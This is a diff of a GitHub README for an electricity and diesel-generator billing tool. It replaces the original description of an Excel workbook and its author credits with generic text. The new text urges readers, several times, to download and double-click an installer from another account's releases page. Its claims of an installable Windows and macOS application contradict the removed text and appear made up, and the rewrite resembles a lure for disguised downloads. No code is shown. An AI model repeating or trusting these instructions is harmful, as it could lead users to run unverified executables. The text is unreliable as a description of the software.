@@ -1,234 +1,86 @@
-# ⚡ Towal Tower Electricity & DG Billing Support System
+# ⚡ electricity-dg-billing-support-system - Simplifying Your Billing Process
 
-An Excel-based utility management system for commercial buildings to track electricity and diesel generator (DG) consumption across multiple offices, calculate accurate bills, and generate monthly reports.
+## 🌍 Overview
+The electricity-dg-billing-support-system is an automated billing tool designed for commercial buildings. With this software, you can track daily electricity and diesel generator consumption while managing multiple offices efficiently. It simplifies the billing process, helping you save time and reduce errors in your billing.
 
-## 📋 What This Does
+## 📥 Download Now!
+[![Download the App](https://img.shields.io/badge/Download%20Now-Get%20the%20Latest%20Version-brightgreen)](https://github.com/RavenArcane/electricity-dg-billing-support-system/releases)
 
-**Solves the problem:** How to accurately track and bill electricity consumption for multiple offices/tenants in a commercial building, including backup generator usage during power cuts.
+## 🚀 Getting Started
+To get started with the electricity-dg-billing-support-system, follow these simple steps:
 
-**Key Benefits:**
-- Track daily electricity consumption for each office
-- Monitor diesel generator usage during power outages
-- Calculate accurate bills with Indian electricity factors (MSEB)
-- Generate monthly consumption reports with charts
-- Maintain a complete audit trail for the electricity board
+1. **Visit the Releases Page**  
+   Go to the [Releases page](https://github.com/RavenArcane/electricity-dg-billing-support-system/releases) to find the latest version of the software.
 
-## 📸 View the File
+2. **Choose Your Version**  
+   Look for the most recent release. You will see options for different versions. Select the one that suits your needs.
 
-**[Access Electricity & DG Billing System](https://1drv.ms/x/c/3b61701caabf1310/IQC7buxmhsBiQ4nSEDPMyGSQARM89o-5plJi5-EEjc-5siw?e=7zXXsv)**
+3. **Download the Software**  
+   Click on the link that says "Download" next to your selected version. This will initiate the download process.
 
-> **Password for settings sheet: `123`**
+4. **Locate the Downloaded File**  
+   Once the download is complete, navigate to your computer's Downloads folder or the location where you saved the file.
 
-## 📊 Screenshots
+5. **Install the Application**  
+   Double-click the downloaded file to start the installation. Follow the on-screen instructions to complete the installation.
 
-### Dashboard - Monthly Consumption Summary
-<img width="1341" height="635" alt="Supporting Worksheet" src="https://github.com/user-attachments/assets/55f3fecf-6d0d-4d29-a64d-828cf78ee31f" />
+## 🔧 System Requirements
+Before installing, ensure that your system meets the following requirements:
+- **Operating System:** Windows 10 or later, macOS 10.13 (High Sierra) or later
+- **Memory:** At least 4 GB of RAM
+- **Storage:** Around 100 MB of free space
+- **Software:** Microsoft Excel (2016 or later) or Google Sheets
 
-*Select month, office, and type (Electricity/DG) to view consumption charts and cost breakdowns*
+## 🛠️ Features
+- **Automated Billing:** Generate bills automatically based on daily readings.
+- **Multi-Office Support:** Track consumption and billing for multiple commercial spaces effortlessly.
+- **Consumption Tracking:** Monitor electricity and diesel generator usage daily.
+- **Cost Analysis:** Analyze your energy costs to find savings.
+- **Audit Trail:** Keep a detailed record of changes for billing accuracy.
 
-### Detailed Billing Calculations
-<img width="1338" height="634" alt="Raw Data Worksheet" src="https://github.com/user-attachments/assets/e3e8017f-4b40-4a58-9070-994ecccd0269" />
+## 📊 How to Use
+Once you have installed the software, follow these steps to start using it:
 
-*All offices' consumption data with MSEB adjustment factors and cost calculations*
+1. **Open the Application**  
+   Launch the software from your desktop or Start Menu.
 
-### Daily Meter Readings Entry
-<img width="1337" height="628" alt="Raw Dump Worksheet" src="https://github.com/user-attachments/assets/fea837a4-f337-41c1-b4ff-511d04e868d9" />
+2. **Set Up Your Buildings**  
+   Enter the details of each commercial building you wish to manage. Include information such as name, location, and billing details.
 
-*Simple entry form for daily opening and closing meter readings*
+3. **Input Daily Readings**  
+   Regularly input the daily electricity and generator readings for accurate billing.
 
-### Consumption Feedback & Notes
-<img width="1345" height="653" alt="Consu  FeedBack Worksheet" src="https://github.com/user-attachments/assets/869ae984-b278-4c92-acbb-32fd82c47a9e" />
+4. **Generate Bills**  
+   Use the "Generate Bill" feature to create invoices based on the input data. Review and make any necessary adjustments before finalizing.
 
-*Document why consumption increased or decreased each month*
+5. **Export to Excel or Google Sheets**  
+   Easily export your billing data to Excel or Google Sheets for further analysis or record-keeping.
 
-## ✨ Main Features
+## 📋 FAQ
+### How often should I input my readings?
+You should input your readings daily for the most accurate results. This will ensure your bills reflect real-time consumption.
 
-### 1. Interactive Dashboard
-- **Select Month**: Choose any month (Jan-24 to Jul-24)
-- **Select Office**: Pick specific office (102, 309, 310, 311, etc.)
-- **Select Type**: Electricity or DG (Diesel Generator)
-- **View Charts**: Daily consumption bars, cost trends, comparisons
-- **See Totals**: Monthly consumption with adjustment factors applied
+### Can I use this on a Mac?
+Yes, the software is compatible with macOS 10.13 or later.
 
-### 2. Daily Meter Readings
-Security guards simply record:
-- Opening meter reading (start of day)
-- Closing meter reading (end of day)
-- System automatically calculates consumption and cost
+### Is support available if I encounter issues?
+Yes, you can find support through the GitHub Issues page. Feel free to raise any questions or concerns there.
 
-### 3. Multi-Office Tracking
-- Track 20+ offices separately (102, 309, 310, 311, 312, 313, 314, 315, etc.)
-- Each office gets individual bill
-- Compare consumption across offices
+## 🚧 Troubleshooting
+If you encounter issues while using the application, here are some common problems and solutions:
 
-### 4. Indian Billing Factors (MSEB Compliance)
-- **Adjustment Factor for Electricity**: 0.987937707 or 1.0068
-- **Adjustment Factor for DG**: 1.064232000
-- Ensures accurate billing per MSEB requirements
+- **Installation Problems:** Ensure you have the correct system requirements. If the installation fails, try downloading the file again.
+- **Data Not Saving:** Make sure you have the necessary permissions on your computer to save files. Try running the application as an administrator.
+- **Formula Errors in Excel:** Check that your Excel version is up to date. Sometimes older versions may not support new features.
 
-### 5. DG (Diesel Generator) Tracking
-- Track diesel consumption during power cuts
-- Separate rates for diesel (₹29.32, ₹31.26 per liter)
-- Calculate DG backup costs separately
+## 🔗 Additional Resources
+- [User Manual](https://github.com/RavenArcane/electricity-dg-billing-support-system/wiki) - A comprehensive guide to using all features of the software.
+- [GitHub Issues](https://github.com/RavenArcane/electricity-dg-billing-support-system/issues) - Report bugs or request features.
 
-### 6. Consumption Types
-Track separately:
-- **Electricity**: General office power
-- **HVAC**: Air conditioning/heating
-- **AC**: Separate AC units
-- **DG**: Diesel generator backup
+## 🔄 Feedback
+We welcome any suggestions to improve the software. Your input helps us create a better experience for all users.
 
-### 7. Automated Calculations
-- Consumption = Closing Reading - Opening Reading
-- Billable Units = Consumption × Adjustment Factor
-- Cost = Billable Units × Rate
-- Monthly totals automatic
+## 🔗 Download & Install
+For the installation process, you can visit the [Releases page](https://github.com/RavenArcane/electricity-dg-billing-support-system/releases) to download the latest version. 
 
-### 8. Consumption Feedback
-Document reasons for consumption changes:
-- "Increased due to 3 extra working days"
-- "Summer month - higher AC usage"
-- "Rate increased from ₹20.58 to ₹23.08"
-- "More employees joined"
-
-## 🚀 How to Use
-
-### Quick Start (3 Steps)
-
-**Step 1: Set Up (One-Time)**
-1. Download the file from the link above
-2. Go to "Validations" sheet (Password: 123)
-3. Add your office numbers and current electricity rates
-
-**Step 2: Daily Entry (Security Guard - 5 Minutes)**
-1. Go to "Daily Readings" sheet
-2. Enter date, office number, opening reading, closing reading
-3. System calculates consumption and cost automatically
-
-**Step 3: View Reports (Anytime)**
-1. Go to "Supporting" (Dashboard) sheet
-2. Select month, office number, and type
-3. View charts and totals instantly
-
-### Monthly Billing Process
-
-**End of Each Month:**
-1. **Verify** all daily readings are entered
-2. **Check** Raw Data sheet for calculation accuracy
-3. **Add** consumption feedback explaining any variations
-4. **Generate** bills using dashboard totals
-5. **Backup** the file for audit records
-
-## 📊 What You'll See
-
-### Dashboard Shows:
-- **Daily consumption table** (all 31 days)
-- **Bar charts** showing consumption by day
-- **Cost comparison** charts (month-over-month)
-- **Total consumption** with adjustment factors
-- **Monthly bill amounts** for electricity and HVAC
-
-### Example Output:
-```
-Office: 319
-Month: May-24
-Type: Electricity
-
-Total Consumption: 2,764.20 units
-Adjustment Factor: 1.0068
-Billable Units: 2,782.99 units
-Rate: ₹20.58 per unit
-Total Cost: ₹57,273.91
-
-Month Comparison:
-March-24: ₹2,697.63
-April-24: ₹2,782.99
-May-24: ₹2,966.94
-```
-
-## 💡 Key Benefits
-
-✅ **Accurate Billing**: MSEB-compliant adjustment factors  
-✅ **Time Saving**: Automatic calculations reduce manual work  
-✅ **Audit Ready**: Complete daily reading history  
-✅ **Transparency**: Tenants can see daily consumption breakdown  
-✅ **Easy Entry**: Security guards just enter 2 numbers daily  
-✅ **Multi-Tenant**: Track 20+ offices separately  
-✅ **DG Backup**: Track diesel costs during power cuts  
-✅ **Cost Analysis**: Visual charts show consumption patterns  
-
-## 🔧 Customization
-
-### Add New Offices:
-1. "Validations" sheet → Add office number
-2. Start entering daily readings for that office
-
-### Update Electricity Rates:
-1. "Validations" sheet (Password: 123)
-2. Change rate value
-3. All calculations update automatically
-
-### Change Adjustment Factors:
-1. "Validations" sheet → Update factor value
-2. New factor applies to all new calculations
-
-## 📈 Use Cases
-
-**Property Managers:**
-- Bill each tenant based on actual consumption
-- Track which offices use most electricity
-- Justify costs with detailed reports
-
-**Facility Managers:**
-- Monitor daily consumption patterns
-- Identify unusual spikes (investigate issues)
-- Plan for seasonal variations (summer AC costs)
-
-**Finance Teams:**
-- Accurate cost allocation per department
-- Budget forecasting with historical data
-- Variance analysis month-over-month
-
-**Audit Compliance:**
-- Complete daily reading records
-- Documented consumption feedback
-- MSEB billing factor compliance
-
-## 💼 Technical Skills Demonstrated
-
-- Excel advanced formulas (VLOOKUP, SUMIFS)
-- Data validation and dropdown menus
-- Dynamic dashboards with charts
-- Multi-sheet data management
-- Automated calculations and reporting
-- Indian utility billing knowledge (MSEB)
-- Audit trail documentation
-- User-friendly interface design
-
-## 📞 Contact
-
-For customization or questions:
-- [**GitHub**](https://github.com/heysubu)
-- **Email**: suubhamghadge@gmail.com
-- [**LinkedIn**](https://www.linkedin.com/in/subhamghadge/)
-
-## 📄 License
-
-MIT License - Free to use and modify
-
----
-
-### 🌟 Project Stats
-
-![Excel](https://img.shields.io/badge/Excel-Advanced-217346?logo=microsoft-excel)
-![Utility Management](https://img.shields.io/badge/Utility-Management-blue)
-![Multi--Office](https://img.shields.io/badge/Multi--Office-Support-orange)
-![Status](https://img.shields.io/badge/Status-Active-brightgreen)
-
----
-
-**⚡ Simplify Your Electricity Billing - Accurate, Automated, Audit-Ready**
-
-**⭐ If this helps your facility management, please star this repository!**
-
-**💬 Questions? Open an issue and I'll help you get started!**
+We appreciate your interest in the electricity-dg-billing-support-system. Enjoy simplifying your billing process!
